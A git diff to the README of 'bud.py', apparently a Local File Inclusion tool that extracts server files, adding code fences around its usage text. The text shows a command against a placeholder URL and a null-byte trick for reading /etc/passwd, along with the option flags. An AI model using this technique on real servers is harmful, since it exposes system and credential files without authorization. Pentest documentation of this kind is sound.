@@ -19,6 +19,7 @@ This script automatically extracts user / system files trough Local File Inclusi
 * python bud.py -hh
 
 # How to use
+```
 an actual results file here. git markup does not like all those hashtags :)
 *python bud.py -u "http://vulie.local/image.php?mime=jpg&src=&ast;" -e jpg -i*
 -u: the url to start with, needs mime set to extension to actually call the vuln function
@@ -26,9 +27,9 @@ also both mime and extension must be a valid image format
 -e jpg to append a null-byte followed by the fake extension
 back-end sees: /etc/passwd\0.jpg
 server sees: /etc/passwd
-
+```
 *Output of this command is available in results.txt*
-
+```
 Usage: bud.py [options]
 
 Options:
@@ -45,3 +46,4 @@ Options:
   -f FAKE_EXTENSION, --fake-ext=FAKE_EXTENSION
                         Use null-byte followed by this fake extension (enables
                         -n)
+```
